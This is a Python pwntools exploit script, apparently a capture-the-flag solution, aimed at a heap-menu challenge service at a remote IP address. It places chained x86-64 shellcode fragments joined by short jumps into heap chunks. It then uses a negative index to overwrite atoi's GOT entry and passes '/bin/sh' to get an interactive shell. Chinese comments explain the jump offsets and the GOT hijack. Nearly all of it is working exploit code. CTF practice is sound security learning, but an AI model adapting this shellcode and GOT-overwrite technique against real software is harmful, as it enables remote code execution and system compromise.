import time
from pwn import *

context(os='linux', arch='amd64', log_level='debug')

# p = process('../file/1f10c9df3d784b5ba04b205c1610a11e')
p = remote('61.147.171.105', '61348')

def create(index, size, content):
    p.sendlineafter(b'choice>> ', b'1')
    p.sendlineafter(b'index:', index)
    p.sendlineafter(b'size:', size)
    p.sendlineafter(b'content:', content)

def delete(index):
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b'index:', index)

# 0xeb19为短跳转指令，跳到0x19个字节后，之所以是19个字节，是因为堆分配的逻辑
# 0x90为nop指令
code0 = asm('xor rax,rax') + b'\x90\xeb\x1a' # 少一个字节，不然无法成功，对应的跳转指令也加1偏移
code1 = asm('mov eax,0x3b') + b'\xeb\x19'
code2 = asm('xor rsi,rsi') + b'\x90\x90\xeb\x19'
code3 = asm('xor rdx,rdx') + b'\x90\x90\xeb\x19'
code4 = asm('syscall').ljust(7, b'\x90')

create(b'0', b'8', code0)
create(b'1', b'8', code1)
create(b'2', b'8', code2)
create(b'3', b'8', code3)
create(b'4', b'8', code4)

delete(b'0')

input('continue?')

# -8偏移处为atoi的got地址，我们将其劫持，指向我们写入堆中的指令片段
create(b'-8', b'8', code0)

p.sendlineafter(b'>> ', b'/bin/sh')

p.interactive()